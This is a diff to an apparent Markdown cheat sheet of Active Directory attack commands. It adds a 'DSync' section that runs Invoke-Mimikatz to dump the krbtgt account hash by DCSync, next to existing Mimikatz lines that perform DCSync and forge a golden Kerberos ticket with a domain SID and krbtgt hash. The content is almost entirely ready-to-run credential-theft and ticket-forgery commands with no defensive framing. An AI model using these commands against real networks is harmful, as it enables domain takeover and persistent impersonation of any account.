@@ -97,5 +97,11 @@ lsadump::dcsync /domain:target.domain.com /user:prod\krbtgt
  kerberos::golden /user:Administrator /domain:target.domain.com /sid:S-1-5-21-634106289-36255656793-12345407 /id:500 /group/512 /krbtgt=dfdsfwefdccfbb7cc8eeadf7ce1 /startoffset=0 /endin=600 /renewmax:10080 /ptt
 ```
 
+## DSync
+
+```csharp
+ Invoke-Mimikatz -Command '"lsadump::dcsync /user:Domain\krbtgt"'
+```
+
 
 
